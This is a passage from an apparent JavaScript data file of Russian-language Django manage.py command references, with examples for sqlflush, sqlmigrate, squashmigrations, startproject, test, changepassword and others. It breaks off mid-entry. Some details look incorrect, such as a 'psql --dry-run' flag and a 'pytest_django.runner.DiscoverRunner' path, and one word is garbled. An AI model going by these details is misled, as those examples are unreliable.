$ python manage.py showmigrations --plan | grep -E "^\\[ \\]"
[ ]  blog.0002_post_published
$ echo $?
0
# (grep вернёт 0, если неприменённые есть, поэтому удобнее makemigrations --check)

# Типичные сценарии:
# 1) Перед deploy — посмотреть, что будет применяться
$ python manage.py showmigrations --plan | grep "^\\[ \\]"
# 2) После rollback — убедиться в нужном состоянии
$ python manage.py showmigrations blog
# 3) Сравнение dev/staging — diff двух выводов

# JSON-разбор вывода в скриптах не предусмотрен — используйте
# программный API:
from django.db.migrations.recorder import MigrationRecorder
from django.db import connections
applied = set(MigrationRecorder(connections['default']).migration_qs.values_list('app', 'name'))
print(applied)`,
  },
  {
    name: "sqlflush",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py sqlflush — печатает (но не выполняет) SQL-инструкции, которые очистили бы все таблицы текущей БД и сбросили автоинкрементные счётчики (как это делает manage.py flush). Не выполняет ничего напрямую — только выводит SQL, который можно перенаправить в файл, посмотреть глазами или передать в psql/mysql вручную. Полезно для аудита, генерации скриптов truncate и в тестовой инфраструктуре.",
    syntax: "manage.py sqlflush [--database DATABASE]",
    arguments: [
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES. По умолчанию default. SQL генерируется с учётом диалекта выбранного бэкенда (PostgreSQL/MySQL/SQLite/Oracle).",
      },
    ],
    example: `# Посмотреть SQL для очистки текущей БД
$ python manage.py sqlflush
BEGIN;
TRUNCATE "django_admin_log", "auth_group", "auth_group_permissions",
        "auth_permission", "auth_user", "auth_user_groups",
        "auth_user_user_permissions", "blog_post", "django_session" RESTART IDENTITY;
COMMIT;

# Сохранить в файл и применить вручную
$ python manage.py sqlflush > flush.sql
$ psql mydb < flush.sql

# Для конкретной БД (multi-DB)
$ python manage.py sqlflush --database analytics

# Сравнение с командой flush:
#   manage.py flush       — применяет очистку немедленно (с подтверждением)
#   manage.py sqlflush    — только печатает SQL, ничего не делает с БД

# Применение в pytest-фикстурах для быстрого reset (вместо flush)
import subprocess
from django.db import connection

def reset_db():
    sql = subprocess.check_output(
        ['python', 'manage.py', 'sqlflush'],
        text=True
    )
    with connection.cursor() as cur:
        cur.execute(sql)

# В разных СУБД синтаксис будет разным
# PostgreSQL: TRUNCATE ... RESTART IDENTITY;
# MySQL:      TRUNCATE \`table\`; (счётчики сбрасываются автоматически)
# SQLite:     DELETE FROM "table"; DELETE FROM sqlite_sequence WHERE name='table';

# ВНИМАНИЕ: sqlflush не очищает таблицы, отсутствующие в моделях
# (например, созданные миграциями RunSQL вручную). Для них нужны
# собственные TRUNCATE.`,
  },
  {
    name: "sqlmigrate",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py sqlmigrate — печатает SQL, который Django выполнит при применении (или откате с --backwards) указанной миграции. Не модифицирует БД — только генерирует и выводит SQL для ревью, code review миграций, объяснения изменений DBA или применения вручную в окружениях с ограниченным доступом. SQL зависит от диалекта выбранной БД.",
    syntax:
      "manage.py sqlmigrate app_label migration_name [--backwards] [--database DATABASE]",
    arguments: [
      {
        name: "app_label",
        description:
          'Метка приложения, к которому относится миграция (например, "blog", "auth").',
      },
      {
        name: "migration_name",
        description:
          'Имя миграции — полное (0002_post_published) или однозначный префикс ("0002"). Если префикс неоднозначен, Django выдаст ошибку.',
      },
      {
        name: "--backwards",
        description:
          "Сгенерировать SQL для отката указанной миграции вместо её применения. Полезно для проверки, что rollback корректно отменяет изменения.",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД для генерации SQL с учётом её диалекта. По умолчанию default. Влияет только на формат SQL (PostgreSQL vs MySQL vs SQLite vs Oracle).",
      },
    ],
    example: `# SQL для применения миграции (forward)
$ python manage.py sqlmigrate blog 0002
BEGIN;
--
-- Add field published to post
--
ALTER TABLE "blog_post" ADD COLUMN "published" boolean DEFAULT false NOT NULL;
ALTER TABLE "blog_post" ALTER COLUMN "published" DROP DEFAULT;
COMMIT;

# По однозначному префиксу
$ python manage.py sqlmigrate blog 0002

# SQL для отката (reverse)
$ python manage.py sqlmigrate blog 0002 --backwards
BEGIN;
--
-- Add field published to post (reversed)
--
ALTER TABLE "blog_post" DROP COLUMN "published";
COMMIT;

# Для другой БД (например, MySQL)
$ python manage.py sqlmigrate blog 0002 --database mysql_replica
BEGIN;
--
-- Add field published to post
--
ALTER TABLE \`blog_post\` ADD COLUMN \`published\` bool DEFAULT 0 NOT NULL;
ALTER TABLE \`blog_post\` ALTER COLUMN \`published\` DROP DEFAULT;
COMMIT;

# Типичные сценарии:
# 1) Code review миграций — добавить SQL в PR-описание
$ python manage.py sqlmigrate blog 0042 > pr-sql.txt

# 2) Согласование с DBA в окружениях, где Django не может ALTER напрямую
$ python manage.py sqlmigrate blog 0042 | psql --dry-run mydb

# 3) Объяснение производительности — посмотреть, не заблокирует ли таблицу
$ python manage.py sqlmigrate blog 0042
# Видим LOCK TABLE / ALTER TABLE без CONCURRENTLY → запланировать окно

# 4) Проверка идемпотентности отката
$ python manage.py sqlmigrate blog 0042
$ python manage.py sqlmigrate blog 0042 --backwards
# Сравнить, что reverse действительно отменяет forward

# ВНИМАНИЕ: миграции с RunPython и сложным RunSQL могут не выводить
# полный SQL — sqlmigrate показывает только декларативные операции.
# Для RunPython вы увидите комментарий "-- Raw Python operation".`,
  },
  {
    name: "sqlsequencereset",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py sqlsequencereset — печатает SQL для сброса автоинкрементных последовательностей (sequences) PostgreSQL и Oracle к значению, следующему за максимальным существующим id в каждой таблице. Применяется после загрузки фикстур с явными id, ручного INSERT или импорта данных, когда счётчики БД отстают и следующий INSERT падает с UniqueViolation. На SQLite/MySQL не нужна — там автоинкремент учитывается иначе.",
    syntax:
      "manage.py sqlsequencereset app_label [app_label ...] [--database DATABASE]",
    arguments: [
      {
        name: "app_label [app_label ...]",
        description:
          "Один или несколько меток приложений. SQL будет сгенерирован для всех таблиц моделей этих приложений. Без аргументов команда не сработает (требует хотя бы одно приложение).",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES. По умолчанию default. Имеет смысл только на PostgreSQL/Oracle — для других бэкендов выводится пустая строка.",
      },
    ],
    example: `# Сгенерировать SQL для сброса sequences приложения blog
$ python manage.py sqlsequencereset blog
BEGIN;
SELECT setval(pg_get_serial_sequence('"blog_post"','id'),
              coalesce(max("id"), 1), max("id") IS NOT null) FROM "blog_post";
SELECT setval(pg_get_serial_sequence('"blog_comment"','id'),
              coalesce(max("id"), 1), max("id") IS NOT null) FROM "blog_comment";
COMMIT;

# Для нескольких приложений сразу
$ python manage.py sqlsequencereset auth contenttypes blog

# Применить через psql (PostgreSQL)
$ python manage.py sqlsequencereset blog | psql mydb

# Через Django shell — без shell-pipe
$ python manage.py shell -c "
from django.core.management import call_command
from django.db import connection
import io
buf = io.StringIO()
call_command('sqlsequencereset', 'blog', stdout=buf)
sql = buf.getvalue()
with connection.cursor() as cur:
    cur.execute(sql)
"

# Типичные ситуации, когда нужно:
# 1) После loaddata с фикстурами, содержащими явные id
$ python manage.py loaddata initial_data.json
$ python manage.py sqlsequencereset blog | psql mydb
# Иначе следующий INSERT в blog_post упадёт с UniqueViolation

# 2) После ручного COPY/INSERT в обход ORM
$ psql mydb -c "COPY blog_post (id, title) FROM 'data.csv' CSV;"
$ python manage.py sqlsequencereset blog | psql mydb

# 3) После импорта дампа из другого окружения
$ pg_restore -d mydb dump.sql
$ python manage.py sqlsequencereset blog auth | psql mydb

# Для SQLite/MySQL — команда возвращает пустой результат:
$ python manage.py sqlsequencereset blog --database sqlite_db
# (пусто — на этих бэкендах sequences управляются иначе)

# ВНИМАНИЕ: ALTER SEQUENCE не транзакционен в PostgreSQL, поэтому
# одновременные INSERT во время сброса могут получить старые id.
# Применяйте в окне обслуживания или с блокировкой таблицы:
BEGIN;
LOCK TABLE blog_post IN EXCLUSIVE MODE;
SELECT setval(...);
COMMIT;`,
  },
  {
    name: "squashmigrations",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py squashmigrations — объединяет последовательность миграций приложения в одну сжатую миграцию, эквивалентную их совместному применению. Используется для борьбы с разрастанием истории миграций (десятки/сотни файлов), ускорения создания новых тестовых БД и упрощения чтения. Создаёт новый файл с суффиксом _squashed_, помечая исходные миграции как replaces=[...]. После применения на всех окружениях исходные файлы можно удалить вручную.",
    syntax:
      "manage.py squashmigrations app_label [start_migration_name] migration_name [--no-optimize] [--noinput/--no-input] [--squashed-name SQUASHED_NAME] [--no-header]",
    arguments: [
      {
        name: "app_label",
        description: "Метка приложения, миграции которого нужно сжать.",
      },
      {
        name: "start_migration_name",
        description:
          "Опциональное имя (или префикс) миграции, с которой начинать сжатие. Если не указано — сжимаются все миграции с самого начала до migration_name. Полезно, если первые миграции уже устоялись и менять их рискованно.",
      },
      {
        name: "migration_name",
        description:
          "Имя (или префикс) последней миграции, до которой включительно (вместе с ней) производится сжатие.",
      },
      {
        name: "--no-optimize",
        description:
          "Отключить оптимизацию операций миграций (объединение CreateModel+AddField в одну CreateModel и т. п.). Полезно при отладке, если оптимизатор даёт неожиданный результат.",
      },
      {
        name: "--noinput, --no-input",
        description:
          "Не задавать интерактивных вопросов. Использовать дефолтные оn�веты (например, отвечать «да» на вопросы про сохранение оригинальных файлов). Обязательно в CI/скриптах.",
      },
      {
        name: "--squashed-name SQUASHED_NAME",
        description:
          "Имя для создаваемой сжатой миграции (без префикса с номером и без расширения .py). По умолчанию формируется как 0001_squashed_<последняя_миграция>. Удобно задавать осмысленное имя при долгоживущих squash-миграциях.",
      },
      {
        name: "--no-header",
        description:
          "Не вставлять автогенерируемый заголовок-комментарий с описанием времени и Django-версии в начало файла сжатой миграции. Делает diff-ы более стабильными между запусками.",
      },
    ],
    example: `# Сжать все миграции blog с 0001 до 0042 включительно
$ python manage.py squashmigrations blog 0042
Will squash the following migrations:
 - 0001_initial
 - 0002_post_published
 - ...
 - 0042_add_index_on_slug
Do you wish to proceed? [yN] y
Optimizing...
  Optimized from 84 operations to 12 operations.
Created new squashed migration /app/blog/migrations/0001_squashed_0042_add_index_on_slug.py

# Сжать диапазон от 0010 до 0042 (первые 9 оставляем как есть)
$ python manage.py squashmigrations blog 0010 0042

# Без интерактива — для CI
$ python manage.py squashmigrations blog 0042 --noinput

# Кастомное имя сжатой миграции
$ python manage.py squashmigrations blog 0042 \\
    --squashed-name "0001_baseline_2024"
# создаст 0001_baseline_2024.py

# Без автоматической оптимизации операций
$ python manage.py squashmigrations blog 0042 --no-optimize

# Без заголовка-комментария (стабильный diff)
$ python manage.py squashmigrations blog 0042 --no-header

# Жизненный цикл squash-миграций:
# 1. squashmigrations — создаётся новый файл с replaces=[...]
# 2. Закоммитить, дождаться, пока ВСЕ окружения применят (миграции из replaces)
# 3. Удалить оригинальные файлы 0001..0042 и убрать атрибут replaces
# 4. Опционально — оптимизировать ещё раз через optimizemigration

# Сжатая миграция выглядит так:
class Migration(migrations.Migration):
    replaces = [
        ('blog', '0001_initial'),
        ('blog', '0002_post_published'),
        # ...
        ('blog', '0042_add_index_on_slug'),
    ]
    dependencies = [('auth', '0012_alter_user_first_name_max_length')]
    operations = [...]

# ВАЖНО:
#   - Нельзя сжимать миграции с RunPython, если они содержат ссылки на
#     модели через apps.get_model — нужно вручную перенести функции
#     в squashed-файл.
#   - После удаления оригинальных файлов окружения, не успевшие применить
#     squashed-миграцию, не смогут перейти на новую версию кода.`,
  },
  {
    name: "startapp",
    category: "django-admin and manage.py",
    description:
      "Команда django-admin startapp / manage.py startapp — создаёт каталог нового Django-приложения с шаблонной структурой: apps.py, models.py, views.py, admin.py, tests.py, migrations/ и т. д. Поддерживает кастомные шаблоны приложений (свой скелет с дополнительными файлами, urls.py, тестами, requirements). Используется при добавлении новой функциональной области в существующий проект.",
    syntax:
      "manage.py startapp name [directory] [--template TEMPLATE] [--extension EXTENSIONS/-e EXTENSIONS] [--name FILES/-n FILES] [--exclude DIRECTORIES/-x DIRECTORIES]",
    arguments: [
      {
        name: "name",
        description:
          "Имя нового приложения (валидный Python-идентификатор: буквы, цифры, _, не начинается с цифры, не совпадает с встроенными модулями Python).",
      },
      {
        name: "directory",
        description:
          "Опциональный путь к каталогу, куда создавать приложение. По умолчанию используется текущий каталог + name. Удобно для размещения приложений во вложенной структуре (например, apps/blog/).",
      },
      {
        name: "--template TEMPLATE",
        description:
          "Путь или URL к каталогу/архиву (.zip/.tar.gz) с альтернативным шаблоном приложения. Файлы шаблона рендерятся как Django-шаблоны с переменными app_name, camel_case_app_name и docs_version.",
      },
      {
        name: "--extension EXTENSIONS, -e EXTENSIONS",
        description:
          "Список расширений файлов, которые нужно обрабатывать как Django-шаблоны (подставлять переменные). По умолчанию только .py. Можно указать несколько раз: -e py -e txt -e md.",
      },
      {
        name: "--name FILES, -n FILES",
        description:
          "Конкретные имена файлов, которые тоже нужно рендерить как шаблоны (помимо файлов с расширениями из --extension). Полезно для файлов без расширения, например, Dockerfile или Makefile.",
      },
      {
        name: "--exclude DIRECTORIES, -x DIRECTORIES",
        description:
          "Каталоги, которые нужно исключить при копировании. По умолчанию исключаются .git и __pycache__. Можно повторять флаг.",
      },
    ],
    example: `# Создать стандартное приложение blog в текущем каталоге
$ python manage.py startapp blog
$ tree blog
blog/
├── __init__.py
├── admin.py
├── apps.py
├── migrations/
│   └── __init__.py
├── models.py
├── tests.py
└── views.py

# Создать в произвольном каталоге (apps/blog/)
$ mkdir -p apps/blog
$ python manage.py startapp blog apps/blog

# Использование собственного шаблона из каталога
$ python manage.py startapp blog --template /home/dev/django-app-template

# Шаблон из URL (zip-архив, например, на GitHub)
$ python manage.py startapp blog \\
    --template https://github.com/org/django-app-template/archive/main.zip

# Расширить список рендерящихся файлов
$ python manage.py startapp blog \\
    --template ./template \\
    -e py -e md -e txt -e yml \\
    -n Dockerfile -n Makefile

# Исключить дополнительные каталоги при копировании
$ python manage.py startapp blog --template ./template -x .venv -x node_modules

# После создания — добавить в settings.INSTALLED_APPS
INSTALLED_APPS = [
    'django.contrib.admin',
    # ...
    'blog',                          # или 'apps.blog'
    # либо 'blog.apps.BlogConfig'    # явный AppConfig
]

# Структура своего шаблона приложения (template_dir/):
# template_dir/
# ├── __init__.py-tpl
# ├── apps.py-tpl
# ├── models.py-tpl
# ├── urls.py-tpl              ← добавили urls.py из коробки
# ├── tests/
# │   ├── __init__.py-tpl
# │   ├── test_models.py-tpl
# │   └── test_views.py-tpl
# └── migrations/
#     └── __init__.py-tpl
#
# Файлы с суффиксом -tpl будут переименованы (-tpl убирается),
# и в них подставятся переменные {{ app_name }}, {{ camel_case_app_name }}
# и {{ docs_version }}.

# Пример apps.py-tpl:
# from django.apps import AppConfig
# class {{ camel_case_app_name }}Config(AppConfig):
#     default_auto_field = 'django.db.models.BigAutoField'
#     name = '{{ app_name }}'`,
  },
  {
    name: "startproject",
    category: "django-admin and manage.py",
    description:
      "Команда django-admin startproject — создаёт каталог нового Django-проекта со скелетом: settings.py, urls.py, wsgi.py, asgi.py, manage.py. Используется ОДИН раз при инициализации проекта (после этого вместо django-admin применяется manage.py). Поддерживает кастомные шаблоны проектов с собственной структурой каталогов, дополнительными файлами (Dockerfile, requirements, pre-commit), переменными окружения и т. д.",
    syntax:
      "django-admin startproject name [directory] [--template TEMPLATE] [--extension EXTENSIONS/-e EXTENSIONS] [--name FILES/-n FILES] [--exclude DIRECTORIES/-x DIRECTORIES]",
    arguments: [
      {
        name: "name",
        description:
          "Имя нового проекта (валидный Python-идентификатор). Будет использовано как имя пакета настроек и в шаблонах кастомного template_dir.",
      },
      {
        name: "directory",
        description:
          'Опциональный путь к каталогу, куда создавать проект. По умолчанию используется текущий каталог + name. Передайте ".", чтобы избежать вложенности (settings будут лежать рядом с manage.py).',
      },
      {
        name: "--template TEMPLATE",
        description:
          "Путь или URL (.zip/.tar.gz) к шаблону проекта. Распространённые шаблоны: cookiecutter-django, djangox, корпоративные внутренние шаблоны с уже настроенным CI, Docker, ruff и т. п.",
      },
      {
        name: "--extension EXTENSIONS, -e EXTENSIONS",
        description:
          "Расширения файлов, которые рендерятся как Django-шаблоны. По умолчанию только .py. Можно повторять: -e py -e yml -e json -e cfg.",
      },
      {
        name: "--name FILES, -n FILES",
        description:
          "Имена конкретных файлов (без расширения или с любым) для рендеринга. Удобно для Dockerfile, Makefile, .env.example, README.",
      },
      {
        name: "--exclude DIRECTORIES, -x DIRECTORIES",
        description:
          "Дополнительные каталоги, которые нужно исключить при копировании из шаблона (помимо стандартных .git и __pycache__).",
      },
    ],
    example: `# Стандартное создание проекта (создаст каталог mysite/ с подкаталогом mysite/)
$ django-admin startproject mysite
$ tree mysite
mysite/
├── manage.py
└── mysite/
    ├── __init__.py
    ├── asgi.py
    ├── settings.py
    ├── urls.py
    └── wsgi.py

# Создать в текущем каталоге (без вложенности)
$ mkdir myproject && cd myproject
$ django-admin startproject config .
$ tree
.
├── config/
│   ├── __init__.py
│   ├── asgi.py
│   ├── settings.py
│   ├── urls.py
│   └── wsgi.py
└── manage.py

# Произвольное имя каталога
$ django-admin startproject mysite ~/work/my-django-site

# Использование cookiecutter-подобного шаблона из GitHub
$ django-admin startproject myproject \\
    --template https://github.com/cookiecutter/cookiecutter-django/archive/main.zip \\
    --extension py,yml,toml,md,txt,cfg,ini,Dockerfile \\
    --name Dockerfile,Makefile,.env.example

# Локальный шаблон с расширенным списком расширений и файлов
$ django-admin startproject myproject ~/projects/myproject \\
    --template ~/templates/django-prod-template \\
    -e py -e yml -e toml -e md -e cfg \\
    -n Dockerfile -n Makefile -n .env.example -n .pre-commit-config.yaml \\
    -x .venv -x node_modules

# После создания — следующие шаги
$ cd myproject
$ python -m venv .venv && source .venv/bin/activate
$ pip install django
$ python manage.py migrate
$ python manage.py createsuperuser
$ python manage.py runserver

# Структура шаблона проекта (project_template/):
# project_template/
# ├── manage.py-tpl
# ├── {{ project_name }}/
# │   ├── __init__.py-tpl
# │   ├── settings.py-tpl
# │   ├── urls.py-tpl
# │   ├── wsgi.py-tpl
# │   └── asgi.py-tpl
# ├── requirements/
# │   ├── base.txt
# │   ├── dev.txt
# │   └── prod.txt
# ├── Dockerfile
# └── README.md

# Доступные переменные в шаблонах:
# {{ project_name }}            — точное имя проекта
# {{ camel_case_project_name }} — CamelCase-вариант
# {{ docs_version }}            — версия Django без patch (например, "5.0")
# {{ secret_key }}              — автогенерируемый SECRET_KEY (для settings.py)`,
  },
  {
    name: "test",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py test — запускает тесты Django (по умолчанию через стандартный unittest-совместимый раннер DiscoverRunner). Создаёт отдельную тестовую БД (test_<dbname>), применяет миграции, исполняет тесты, удаляет БД. Поддерживает фильтрацию по меткам, теги, параллельный запуск, сохранение БД между запусками, остановку при первой ошибке, дроп в pdb при сбое и многое другое. Принимает дополнительные аргументы конкретного TEST_RUNNER (например, pytest-django).",
    syntax:
      "manage.py test [test_label [test_label ...]] [--failfast] [--testrunner TESTRUNNER] [--noinput/--no-input] [--keepdb] [--shuffle [SEED]] [--reverse/-r] [--debug-mode] [--debug-sql/-d] [--parallel [N]] [--tag TAGS] [--exclude-tag EXCLUDE_TAGS] [-k TEST_NAME_PATTERNS] [--pdb] [--buffer/-b] [--no-faulthandler] [--timing] [--durations N]",
    arguments: [
      {
        name: "test_label [test_label ...]",
        description:
          'Метки тестов для запуска. Формат: "app_label", "app_label.tests.TestCase", "app_label.tests.TestCase.test_method", путь к файлу или модулю. Без аргументов запускаются все тесты во всех INSTALLED_APPS.',
      },
      {
        name: "--failfast",
        description:
          "Остановить выполнение при первой ошибке/сбое теста. Удобно при отладке — экономит время, не нужно ждать прогона остальных тестов.",
      },
      {
        name: "--testrunner TESTRUNNER",
        description:
          'Полный путь к классу test runner. По умолчанию "django.test.runner.DiscoverRunner". Заменяется на сторонние, например "pytest_django.runner.DiscoverRunner".',
      },
      {
        name: "--noinput, --no-input",
        description:
          "Не задавать интерактивных вопросов. Особенно важно для вопроса об удалении уже существующей тестовой БД — будет автоматически удалена. Обязательно в CI.",
      },
      {
        name: "--keepdb",
        description:
          "Сохранить тестовую БД между запусками (не удалять и не пересоздавать). Резко ускоряет повторные запуски — миграции не применяются заново. Если миграции изменились, БД будет автоматически пересоздана.",
      },
      {
        name: "--shuffle [SEED]",
        description:
          "Перемешать порядок тестов случайным образом для выявления зависимостей между тестами. С опциональным SEED — воспроизводимое перемешивание (полезно в CI для повторения упавшего прогона).",
      },
      {
        name: "--reverse, -r",
        description:
          "Запустить тесты в обратном порядке. Помогает обнаружить тесты, которые зависят от состояния, оставленного предыдущими тестами.",
      },
      {
        name: "--debug-mode",
        description:
          "Установить settings.DEBUG = True перед запуском тестов. По умолчанию во время тестов DEBUG=False, и эта опция позволяет временно включить его (например, чтобы получить детальные SQL-исключения).",
      },
      {
        name: "--debug-sql, -d",
        description:
          "Выводить логи всех выполненных SQL-запросов для упавших тестов. Бесценно при диагностике — видно реальные запросы, их параметры и порядок.",
      },
      {
        name: "--parallel [N]",
        description:
          "Запустить тесты параллельно в N процессах. Без числа — auto (по числу CPU). Каждый процесс получает свою тестовую БД (test_db_1, test_db_2, ...). Не поддерживается для SQLite в стандартной поставке.",
      },
      {
        name: "--tag TAGS",
        description:
          "Запустить только тесты, помеченные указанным тегом через @tag('slow') или Test.tags = ['slow']. Можно повторять для нескольких тегов (логическое ИЛИ).",
      },
      {
        name: "--exclude-tag EXCLUDE_TAGS",
        description:
          "Исключить тесты с указанным тегом. Можно повторять. Удобно для пропуска медленных или интеграционных тестов в pre-commit hook.",
      },
      {
        name: "-k TEST_NAME_PATTERNS",
        description:
          "Запустить только тесты, имена которых соответствуют шаблону (поддерживает unittest-style wildcards: *, ?). Можно повторять — тест запустится, если совпадает хотя бы с одним.",
      },
      {
        name: "--pdb",
        description:
          "Бросать pdb (или ipdb, если установлен) при первой ошибке/сбое. Позволяет интерактивно исследовать состояние во время падения. Часто используется с --failfast.",
      },
      {
        name: "--buffer, -b",
        description:
          "Буферизовать stdout/stderr во время прохождения тестов. Вывод показывается только для упавших тестов — устраняет шум от print() в успешных кейсах.",
      },
      {
        name: "--no-faulthandler",
        description:
          "Отключить модуль faulthandler, который Django включает по умолчанию для печати traceback при сегментационных ошибках. Используется только в случае конфликта с другими отладочными инструментами.",
      },
      {
        name: "--timing",
        description:
          "Показать время выполнения каждого этапа: создания БД, применения миграций, прогона тестов, очистки. Помогает находить узкие места в тестовой инфраструктуре.",
      },
      {
        name: "--durations N",
        description:
          "Вывести N самых медленных тестов в конце прогона. Например, --durations 10 — топ-10 по времени. Помогает находить кандидатов на оптимизацию.",
      },
    ],
    example: `# Запустить все тесты проекта
$ python manage.py test

# Только конкретное приложение / класс / метод
$ python manage.py test blog
$ python manage.py test blog.tests.PostModelTests
$ python manage.py test blog.tests.PostModelTests.test_publish

# Несколько меток сразу
$ python manage.py test blog auth.tests.AuthTests

# Остановиться при первой ошибке
$ python manage.py test --failfast

# Без интерактива (CI), с переиспользованием БД
$ python manage.py test --noinput --keepdb

# Параллельно по числу CPU
$ python manage.py test --parallel
# Конкретное число процессов
$ python manage.py test --parallel 4

# Случайный порядок (с воспроизводимым seed)
$ python manage.py test --shuffle 12345
$ python manage.py test --reverse

# По тегам
# class SlowTests(TestCase):
#     tags = {"slow"}
$ python manage.py test --tag slow
$ python manage.py test --exclude-tag slow

# По шаблону имён
$ python manage.py test -k "test_publish*" -k "*permissions*"

# Отладка: SQL + DEBUG=True + дроп в pdb при ошибке
$ python manage.py test blog --failfast --pdb --debug-sql --debug-mode

# Профилирование медленных тестов
$ python manage.py test --timing --durations 10
Top 10 slowest tests:
  3.21s blog.tests.IntegrationTests.test_full_workflow
  1.05s ...

# Заглушение шумного вывода успешных тестов
$ python manage.py test --buffer

# Альтернативный test runner — pytest-django
$ pip install pytest-django
# pytest.ini:
# [pytest]
# DJANGO_SETTINGS_MODULE = myproject.settings
$ pytest                              # обычно вызывают напрямую pytest
$ python manage.py test --testrunner pytest_django.runner.DiscoverRunner

# Запуск отдельного файла теста
$ python manage.py test blog.tests.test_views

# Минимизация времени локально:
$ python manage.py test --keepdb --parallel --failfast -k "test_changed_*"

# В CI типичный набор:
$ python manage.py test --noinput --parallel --shuffle --buffer --timing`,
  },
  {
    name: "testserver",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py testserver — запускает развитие сервера разработки на тестовой БД, в которую загружаются указанные фикстуры. Удобно для ручного исследования сценария по фикстуре (как ведёт себя приложение с конкретным набором данных), для воспроизведения багов из тестовых данных и для UI-тестов с детерминированным состоянием. Создаваемая БД называется test_<dbname>; данные хранятся только пока сервер запущен — при выходе БД удаляется.",
    syntax:
      "manage.py testserver [fixture [fixture ...]] [--addrport ADDRPORT] [--noinput/--no-input]",
    arguments: [
      {
        name: "fixture [fixture ...]",
        description:
          "Имена фикстур (без расширения) или пути к файлам фикстур (.json/.xml/.yaml), которые нужно загрузить в тестовую БД сразу после её создания. Можно указать несколько; они применяются в указанном порядке. Без аргументов сервер стартует на пустой схеме.",
      },
      {
        name: "--addrport ADDRPORT",
        description:
          'Адрес и порт в формате "[ADDR:]PORT" (например, "8080" или "0.0.0.0:8000"). По умолчанию 127.0.0.1:8000.',
      },
      {
        name: "--noinput, --no-input",
        description:
          "Не задавать интерактивных вопросов. Например, при существующей тестовой БД будет автоматически удалена и пересоздана.",
      },
    ],
    example: `# Запуск пустого testserver
$ python manage.py testserver
Creating test database for alias 'default'...
Performing system checks...
Django version 5.0, using settings 'myproject.settings'
Starting development server at http://127.0.0.1:8000/
Quit the server with CONTROL-C.

# С загрузкой одной фикстуры
$ python manage.py testserver blog/fixtures/sample_posts.json

# Несколько фикстур (применятся последовательно)
$ python manage.py testserver users.json blog_posts.json comments.json

# По именам (Django ищет по INSTALLED_APPS/<app>/fixtures/ и FIXTURE_DIRS)
$ python manage.py testserver sample_posts sample_comments

# Произвольный адрес/порт
$ python manage.py testserver demo_data.json --addrport 0.0.0.0:9000

# Без интерактива (например, в скрипте подготовки демо-стенда)
$ python manage.py testserver demo.json --noinput

# Типовые сценарии:
# 1) Воспроизведение бага, выявленного в тестах:
#    Сохранили состояние — экспорт в фикстуру:
$ python manage.py dumpdata --natural-primary --natural-foreign \\
    --indent 2 blog.Post blog.Comment > bug_repro.json
#    Запустили сервер с тем же состоянием:
$ python manage.py testserver bug_repro.json
#    → открыли http://127.0.0.1:8000/ и воспроизвели вручную

# 2) Детерминированный стенд для UI/E2E-тестов:
$ python manage.py testserver e2e_seed.json &
$ pytest tests/e2e/  # тесты Cypress/Playwright лезут на 127.0.0.1:8000
$ kill %1

# 3) Демонстрация сборки заказчику без правки prod БД:
$ python manage.py testserver demo_full.json --addrport 0.0.0.0:8000

# Различия с runserver:
#   runserver:   работает с реальной БД (DATABASES['default']),
#                все изменения сохраняются.
#   testserver:  создаёт временную test_<dbname>, загружает фикстуры,
#                все изменения теряются после Ctrl+C.

# Во время работы testserver можно выполнять обычные API-запросы,
# заходить в админку (suitable_user должен быть в фикстуре) и т. п.

# ВНИМАНИЕ: testserver всегда использует встроенный лёгкий сервер
# (как runserver) — НЕ для продакшна, только для локального изучения.`,
  },
  {
    name: "changepassword",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py changepassword — изменяет пароль указанного пользователя (или текущего системного пользователя по умолчанию) в модели AUTH_USER_MODEL. Запрашивает новый пароль интерактивно дважды (повторный ввод для контроля), хеширует через PASSWORD_HASHERS и сохраняет в БД. Используется при необходимости сбросить забытый пароль администратора, при компрометации учётной записи или в скриптах первичной настройки.",
    syntax: "manage.py changepassword [<username>] [--database DATABASE]",
    arguments: [
      {
        name: "<username>",
        description:
          "Имя пользователя, чей пароль меняется. Если не указано, берётся имя текущего системного пользователя ОС (значение getpass.getuser()). Поддерживаются кастомные модели User: используется поле USERNAME_FIELD (по умолчанию username, но может быть, например, email).",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, в которой искать пользователя и обновлять пароль. По умолчанию default. Полезно, если AUTH_USER_MODEL хранится в отдельной БД через DATABASE_ROUTERS.",
      },
    ],
    example: `# Поменять пароль конкретного пользователя
$ python manage.py changepassword admin
Changing password for user 'admin'
Password: ********
Password (again): ********
Password changed successfully for user 'admin'

# Без аргумента — берётся текущий пользователь ОС
$ whoami
ivan
$ python manage.py changepassword
Changing password for user 'ivan'
Password: ...

# Если пользователя нет — ошибка
$ python manage.py changepassword nonexistent
CommandError: user 'nonexistent' does not exist

# Для multi-DB конфигурации
$ python manage.py changepassword admin --database accounts_db

# Кастомная модель User с email вместо username
class CustomUser(AbstractUser):
    email = models.EmailField(unique=True)
    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = ['username']
$ python manage.py changepassword user@example.com

# Программный сброс (без интерактива) — НЕ через эту команду,
# т.к. changepassword всегда интерактивна. Используйте shell:
$ python manage.py shell -c "
from django.contrib.auth import get_user_model
u = get_user_model().objects.get(username='admin')
u.set_password('NewSecurePassword123!')
u.save()
print('OK')
"

# Типичные сценарии:
# 1) Забытый пароль суперпользователя на проде (есть SSH-доступ):
$ ssh prod-server
$ cd /app && source .venv/bin/activate
$ python manage.py changepassword admin

# 2) Скрипт первичной настройки:
#    создать суперпользователя без пароля + поменять пароль из переменной
$ DJANGO_SUPERUSER_PASSWORD=$ADMIN_PASSWORD \\
  python manage.py createsuperuser --noinput \\
    --username admin --email admin@example.com
# (createsuperuser удобнее для скриптов, см. соседнюю команду)

# Проверки:
#   - Введённый пароль валидируется через AUTH_PASSWORD_VALIDATORS
#     (длина, общие пароли, схожесть с username и т. д.)
#   - Не подтверждается старый пароль — кто запускает manage.py,
#     тот и устанавливает новый. Защищайте доступ к серверу/manage.py.`,
  },
  {
    name: "createsuperuser",
    category: "django-admin and manage.py",
    description:
